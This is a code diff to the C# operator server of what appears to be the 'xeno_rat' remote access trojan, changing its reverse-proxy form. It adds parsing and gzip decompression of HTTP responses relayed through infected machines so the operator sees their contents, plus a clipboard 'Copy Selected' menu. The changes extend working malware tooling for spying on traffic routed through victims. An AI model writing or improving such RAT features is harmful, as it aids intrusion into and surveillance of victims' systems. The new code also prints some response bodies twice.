@@ -16,6 +16,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using static System.Net.Mime.MediaTypeNames;
 
 namespace xeno_rat_server.Forms
 {
@@ -34,6 +35,16 @@ namespace xeno_rat_server.Forms
             client = _client;
             client.AddTempOnDisconnect(OnClientDisconnect);
             serverCertificate = certificate; // optional, required for TLS
+
+            var listViewContextMenu = new ContextMenuStrip();
+            var copyItem = new ToolStripMenuItem("Copy Selected");
+            copyItem.Click += copySelectedItemsToolStripMenuItem_Click;
+            listViewContextMenu.Items.Add(copyItem);
+
+            listView1.ContextMenuStrip = listViewContextMenu;
+
+            // Optional: show only on right-click on item
+            listView1.MouseDown += ListView1_MouseDown;
         }
 
         private void OnClientDisconnect(Node node)
@@ -508,52 +519,101 @@ namespace xeno_rat_server.Forms
                         string maybeText = null;
                         try { maybeText = Encoding.ASCII.GetString(arr); } catch { maybeText = null; }
 
-                        // Try to find headers first
-                        int headerEnd = maybeText?.IndexOf("\r\n\r\n", StringComparison.Ordinal) ?? -1;
-
-                        if (headerEnd >= 0)
+                        if (!string.IsNullOrEmpty(maybeText))
                         {
-                            string headers = maybeText.Substring(0, headerEnd);
-                            byte[] bodyBytes = arr.Skip(headerEnd + 4).ToArray();
-                            PostUi($"HTTP headers detected: {Trunc(headers, 400)}");
-
-                            // Display body even if no gzip
-                            if (bodyBytes.Length > 0)
+                            // Try to find headers first
+                            int headerEnd = maybeText?.IndexOf("\r\n\r\n", StringComparison.Ordinal) ?? -1;
+                            if (headerEnd >= 0)
                             {
-                                if (LooksLikeText(bodyBytes))
+                                string headers = maybeText.Substring(0, headerEnd);
+                                PostUi($"HTTP headers detected: {Trunc(headers, 400)}");
+
+                                // Check for gzip
+                                bool isGzip = headers.IndexOf("Content-Encoding: gzip", StringComparison.OrdinalIgnoreCase) >= 0;
+
+                                // Try parse Content-Length to know how many body bytes to wait for
+                                int contentLength = 0;
+                                foreach (var line in headers.Split(new[] { "\r\n" }, StringSplitOptions.None))
                                 {
-                                    string bodyText = null;
-                                    try { bodyText = Encoding.UTF8.GetString(bodyBytes); } catch { try { bodyText = Encoding.ASCII.GetString(bodyBytes); } catch { bodyText = null; } }
-                                    if (!string.IsNullOrEmpty(bodyText))
-                                        PostUi($"Body (truncated): {Trunc(bodyText, 1000)}");
+                                    if (line.StartsWith("Content-Length:", StringComparison.OrdinalIgnoreCase))
+                                    {
+                                        int.TryParse(line.Substring(15).Trim(), out contentLength);
+                                        break;
+                                    }
+                                }
+
+                                byte[] bodyBytes = arr.Skip(headerEnd + 4).ToArray();
+
+                                // Only process if we have the full body
+                                if (contentLength == 0 || bodyBytes.Length >= contentLength)
+                                {
+                                    if (isGzip)
+                                    {
+                                        try
+                                        {
+                                            using (var ms = new MemoryStream(bodyBytes))
+                                            using (var gz = new System.IO.Compression.GZipStream(ms, System.IO.Compression.CompressionMode.Decompress))
+                                            using (var dec = new MemoryStream())
+                                            {
+                                                gz.CopyTo(dec);
+                                                string html = Encoding.UTF8.GetString(dec.ToArray());
+                                                PostUi($"Decompressed body: {Trunc(html, 1000)}");
+                                            }
+                                        }
+                                        catch (Exception ex)
+                                        {
+                                            PostUi($"Gzip decompress failed: {ex.Message}");
+                                        }
+                                    }
                                     else
-                                        PostUi($"Body: {bodyBytes.Length} bytes (text detected but decode failed)");
+                                    {
+                                        string bodyText = null;
+                                        try { bodyText = Encoding.UTF8.GetString(bodyBytes); } catch { bodyText = null; }
+                                        if (!string.IsNullOrEmpty(bodyText))
+                                            PostUi($"Body: {Trunc(bodyText, 1000)}");
+                                        else
+                                            PostUi($"Body: {bodyBytes.Length} bytes (binary)");
+                                    }
                                 }
-                                else
-                                {
-                                    PostUi($"Body: {bodyBytes.Length} bytes (binary)");
-                                }
-                            }
 
-                            // Reset buffer so we can parse next response separately
-                            remoteToClientInspect = new MemoryStream();
-                        }
-                        else
-                        {
-                            // If headers not complete, but enough data, show preview
-                            if (arr.Length > 64 && !previewShownRemote)
-                            {
-                                previewShownRemote = true;
-                                if (LooksLikeText(arr))
+                                // Display body even if no gzip
+                                if (bodyBytes.Length > 0)
                                 {
-                                    string preview = null;
-                                    try { preview = Encoding.UTF8.GetString(arr, 0, Math.Min(arr.Length, 200)); } catch { try { preview = Encoding.ASCII.GetString(arr, 0, Math.Min(arr.Length, 200)); } catch { } }
-                                    if (!string.IsNullOrEmpty(preview)) PostUi($"Remote payload preview: {Trunc(preview, 200)}");
+                                    if (LooksLikeText(bodyBytes))
+                                    {
+                                        string bodyText = null;
+                                        try { bodyText = Encoding.UTF8.GetString(bodyBytes); } catch { try { bodyText = Encoding.ASCII.GetString(bodyBytes); } catch { bodyText = null; } }
+                                        if (!string.IsNullOrEmpty(bodyText))
+                                            PostUi($"Body (truncated): {Trunc(bodyText, 1000)}");
+                                        else
+                                            PostUi($"Body: {bodyBytes.Length} bytes (text detected but decode failed)");
+                                    }
+                                    else
+                                    {
+                                        PostUi($"Body: {bodyBytes.Length} bytes (binary)");
+                                    }
                                 }
-                                else
+
+                                // Reset buffer so we can parse next response separately
+                                remoteToClientInspect = new MemoryStream();
+                            }
+                            else
+                            {
+                                // If headers not complete, but enough data, show preview
+                                if (arr.Length > 64 && !previewShownRemote)
                                 {
-                                    string hex = BitConverter.ToString(arr, 0, Math.Min(arr.Length, 64)).Replace("-", " ");
-                                    PostUi($"Remote payload preview (hex): {Trunc(hex, 100)}");
+                                    previewShownRemote = true;
+                                    if (LooksLikeText(arr))
+                                    {
+                                        string preview = null;
+                                        try { preview = Encoding.UTF8.GetString(arr, 0, Math.Min(arr.Length, 200)); } catch { try { preview = Encoding.ASCII.GetString(arr, 0, Math.Min(arr.Length, 200)); } catch { } }
+                                        if (!string.IsNullOrEmpty(preview)) PostUi($"Remote payload preview: {Trunc(preview, 200)}");
+                                    }
+                                    else
+                                    {
+                                        string hex = BitConverter.ToString(arr, 0, Math.Min(arr.Length, 64)).Replace("-", " ");
+                                        PostUi($"Remote payload preview (hex): {Trunc(hex, 100)}");
+                                    }
                                 }
                             }
                         }
@@ -743,6 +803,60 @@ namespace xeno_rat_server.Forms
         private void Reverse_Proxy_Load(object sender, EventArgs e)
         {
             listView1.GetType().GetProperty("DoubleBuffered", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic).SetValue(listView1, true, null);
+        }
+
+        private void copySelectedItemsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (listView1.SelectedItems.Count == 0) return;
+
+            // Gather text first (safe to do on any thread)
+            var sb = new StringBuilder();
+            foreach (ListViewItem item in listView1.SelectedItems)
+            {
+                var line = string.Join("\t", item.SubItems.Cast<ListViewItem.ListViewSubItem>().Select(s => s.Text));
+                sb.AppendLine(line);
+            }
+            string textToCopy = sb.ToString();
+
+            // Clipboard.SetText must run on STA thread
+            Thread staThread = new Thread(() =>
+            {
+                try
+                {
+                    Clipboard.SetText(textToCopy);
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show($"Clipboard copy failed: {ex.Message}");
+                }
+            });
+            staThread.SetApartmentState(ApartmentState.STA);
+            staThread.Start();
+            staThread.Join(); // optional: wait until done
+        }
+
+
+        private void ListView1_MouseDown(object sender, MouseEventArgs e)
+        {
+            if (e.Button == MouseButtons.Right)
+            {
+                var hit = listView1.HitTest(e.Location);
+                if (hit.Item != null)
+                {
+                    // If the clicked item is already selected, do nothing
+                    if (!hit.Item.Selected)
+                    {
+                        // Otherwise, select only this item (single selection)
+                        listView1.SelectedItems.Clear();
+                        hit.Item.Selected = true;
+                    }
+                }
+                else
+                {
+                    // Clicked empty space → clear selection
+                    listView1.SelectedItems.Clear();
+                }
+            }
         }
     }
 }
